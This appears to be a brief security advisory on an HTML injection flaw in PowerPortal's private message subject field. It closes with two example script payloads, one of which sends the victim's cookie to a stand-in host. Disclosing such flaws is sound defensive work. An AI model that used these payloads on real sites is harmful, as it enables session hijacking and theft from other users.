A vulnerability is reported for PowerPortal which may make it prone to HTML injection attacks. The problem is said to occur due to a lack of sufficient sanitization performed on private message data.

Specifically, when creating PowerPortal private messages, the subject field may not be sufficiently sanitized of malicious content. This may make it possible for an attacker to place HTML or script code within the subject field of a private PowerPortal message for another user.

Subject: <script>alert(document.cookie);</script>
Subject: <script>document.location='http://www.example.com/?'+document.cookie</script>
